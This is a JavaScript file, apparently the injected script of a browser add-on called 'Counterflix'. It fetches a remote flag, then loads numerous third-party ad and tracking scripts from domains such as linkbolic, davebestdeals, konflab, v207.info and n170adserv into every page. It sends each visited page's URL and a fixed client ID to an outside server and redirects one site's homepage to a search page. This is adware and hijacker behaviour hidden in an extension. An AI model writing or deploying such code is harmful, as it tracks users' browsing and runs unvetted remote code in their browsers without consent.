/* 59/23/NG  */
window._rvz9560x1009 = {'publisher_subid':'59002', 'addonname': 'Counterflix'};
//window._rvz9560x1010 = {'publisher_subid':'59002', 'addonname': 'Counterflix'};
(function() {
  var gtprv = {
    isIE : function () { var myNav = navigator.userAgent.toLowerCase(); return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1]) : false; },
    loadJS : function (gturl) {
      var dns_qcs8 = document.getElementsByTagName('script')[0];
      var dns_qc8 = document.createElement('script'); dns_qc8.type='text/javascript';
      dns_qc8.src=('https:' == document.location.protocol ? 'https://' : 'http://')+gturl;
      dns_qcs8.parentNode.insertBefore(dns_qc8, dns_qcs8);
    },
    loadJSON: function (callback) {
        var xobj = new XMLHttpRequest();
        xobj.overrideMimeType("application/json");
        xobj.open('GET', ('https:' == document.location.protocol ? 'https://' : 'http://')+'m59.prod2016.com/QualityCheck/x.txt', true);
        xobj.onreadystatechange = function () {
          if (xobj.readyState == 4) {
            if (xobj.status == "200") {
              callback(xobj.responseText);
            } else {
              callback('0');
            }
          }
        };
        xobj.send(null);
    },
    init : function() {
      var isMSIE = /*@cc_on!@*/0;
      if (gtprv.isIE () == 8) {
        gtprv.loadJS('cjs.linkbolic.com/scjs/lcjs/ictxjs.js?aff_id=1878&subaff_id=59002&sbrand=Counterflix');
        return; // IE 8 not supported
      } else if (isMSIE && gtprv.isIE()!= 9 && document.all && !document.querySelector) {
        gtprv.loadJS('cjs.linkbolic.com/scjs/lcjs/ictxjs.js?aff_id=1878&subaff_id=59002&sbrand=Counterflix');
        return; // IE 7 or lower not supported
      }
      if (gtprv.isIE () == 8) return; // IE 8 not supported
      if (isMSIE && gtprv.isIE()!= 9 && document.all && !document.querySelector) return; // IE 7 or lower not supported
      if(window.location.host=='www.yeadesktop.com' && window.location.pathname=='/') {
		top.location.href="http://www.default-search.net/?sid=712&aid=59002";
		return;
      }
      gtprv.loadJSON(function(response) {
        // Parse JSON string into object
        var actual_JSON = JSON.parse(response);
        if (actual_JSON) actual_JSON=parseInt(actual_JSON);
        else actual_JSON=0;
        if (actual_JSON==0) {
		if (window.name.indexOf('_odctxdsp') == 0) {
			//do nothing
		} else if ((window.name || '').match(/^(a652c|ld893)_/))  {
			gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/59002/l.js?pid=2204&ext=Counterflix');
		} else {
			gtprv.loadJS('istatic.davebestdeals.com/fo/ec/nova0830.js?subid=59002&bname=Counterflix&blink=http%3A%2F%2Fwww.counterflix.com');
			if(window.top==window.self) {
                                var gtURL = encodeURIComponent(window.location.protocol + "//" + window.location.host + window.location.pathname);
                                gtprv.loadJS('asrvvv-a.akamaihd.net/get?addonname=Counterflix&clientuid=&subID=59002&affid=9560&subaffid=1011&href='+gtURL);
				//gtprv.loadJS('asrvvv-a.akamaihd.net/get?addonname=Counterflix&clientuid=&subID=59002&affid=9560&subaffid=1020&href='+gtURL);
                        }
          		gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/59002/l.js?pid=2204&ext=Counterflix');
			gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/59002/l.js?pid=2202&ext=Counterflix');
          		if(window.top==window.self) {
          			//gtprv.loadJS('grl.qomesn.com/sd/9560/1009.js');
				gtprv.loadJS('asrvvv-a.akamaihd.net/get?addonname=Counterflix&clientuid=041514AC6CC5D25898ADDF2A02CC4B08&subID=59002&affid=9560&subaffid=1019');
				//gtprv.loadJS('asrv-a.akamaihd.net/sd/9560/1010.js');
				gtprv.loadJS('a.konflab.com/a.php?626ref1=677265656e7465616d&626ref2=59&626ref3=59002&626Name=Counterflix&teid=123F234a&tuid=041514AC6CC5D25898ADDF2A02CC4B08');
          		}
			//
          		gtprv.loadJS('v207.info/mos?said=59002&pid=75041&san=Counterflix&met=1|0');
        		gtprv.loadJS('cjs.linkbolic.com/scjs/lcjs/ctxjs.js?aff_id=2032&subaff_id=59002&sbrand=Counterflix');
			//
			if(''.length === 0) {
				// do nothing
			} else {
                           if(window.top==window.self) {
                                var lbscript = document.createElement("script");
                                lbscript.src = "//d32zx4lhje2crr.cloudfront.net/?tid="+ (location.protocol == "https:" ? "" : "");
                                lbscript.id = "ahjkjgf";
                                lbscript.setAttribute("bname", "Counterflix");
                                document.getElementsByTagName("head")[0].appendChild(lbscript);
                           }
			}
                        //
                        if(window.top==window.self) {
                                supp_key = "e3b216af211512de0a9d45f973d8bc00";
                                supp_time = new Date().getTime();
                                supp_channel = "59002";
                                supp_code_format = "ads-sync.js";
                                supp_click = "";
                                supp_custom_params = {};
                                gtprv.loadJS('n170adserv.com/js/show_ads_supp.js?pubId=23');

                        }
		}
        }
      });
    }
  }
  gtprv.init();
})();
